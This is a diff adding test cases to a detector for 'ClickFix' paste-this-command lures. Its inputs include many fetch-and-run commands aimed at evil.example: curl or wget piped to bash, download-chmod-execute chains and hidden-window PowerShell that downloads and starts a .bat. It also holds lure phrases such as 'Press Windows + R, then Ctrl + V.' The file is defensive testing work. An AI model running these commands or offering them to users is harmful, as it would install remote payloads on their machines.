@@ -35,6 +35,18 @@ describe("ClickFix command detector", () => {
     expect(clickFixTier(`${"a".repeat(20_000)}${cmd}${"a".repeat(20_000)}`)).toBe("strong");
     expect(clickFixTier("a".repeat(20_000))).toBeNull();
     expect(clickFixTier("curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh")).toBe("weak");
+    expect(clickFixTier('/bin/bash -c "$(curl -fsSL https://evil.example/install.sh)"')).toBe("weak");
+    expect(clickFixTier('zsh -c "$(curl -fsSL https://evil.example/x)"')).toBe("weak");
+    expect(clickFixTier("wget -qO- https://evil.example/p | bash")).toBe("weak");
+    expect(clickFixTier("curl -s https://evil.example/p -o /tmp/x && chmod +x /tmp/x && /tmp/x")).toBe("weak");
+    expect(clickFixTier("bash <(curl -fsSL https://evil.example/install.sh)")).toBe("weak");
+    expect(clickFixTier("curl -fsSL https://get.docker.com -o get-docker.sh")).toBeNull();
+    expect(clickFixTier("curl -s https://evil.example/p | python3")).toBeNull();
+    expect(clickFixTier("osascript /tmp/payload.scpt")).toBeNull();
+    expect(clickFixTier('iwr https://evil.example/a.exe -OutFile $env:TEMP\\a.exe; Start-Process $env:TEMP\\a.exe')).toBeNull();
+    expect(clickFixTier('powershell -c "Invoke-WebRequest -Uri https://evil.example/d.bat -OutFile $env:TEMP\\d.bat; Start-Process $env:TEMP\\d.bat"')).toBe("weak");
+    expect(clickFixTier('powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri https://evil.example/cv.bat -OutFile $env:TEMP\\cv.bat; Start-Process $env:TEMP\\cv.bat"')).toBe("strong");
+    expect(clickFixTier("curl -s https://evil.example/p | nohup bash")).toBe("weak");
     expect(clickFixTier(`${"a".repeat(20_000)}\ncurl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`)).toBe("weak");
   });
 
@@ -93,6 +105,10 @@ describe("ClickFix command detector", () => {
     expect(pasteLureContext("Your browser is out of date. Paste the fix.")).toBe(true);
     expect(pasteLureContext("Chrome ist abgestürzt. Füge den Befehl ein.")).toBe(true);
     expect(pasteLureContext("Press Windows + R, then Ctrl + V.")).toBe(true);
+    expect(pasteLureContext("Press Cmd+Space. Open Terminal and paste.")).toBe(true);
+    expect(pasteLureContext("Terminal öffnen und einfügen.")).toBe(false);
+    expect(looksLikeClickFixCommand('/bin/bash -c "$(curl -fsSL https://evil.example/install.sh)"', true)).toBe(true);
+    expect(looksLikeClickFixCommand('/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"', false)).toBe(false);
     expect(looksLikeClickFixCommand("curl -fsSL https://evil.test/fix.sh | sh", true)).toBe(true);
     const buried = `${"Install docs. ".repeat(2000)}Press Windows + R.`;
     expect(pasteLureContext(buried)).toBe(true);
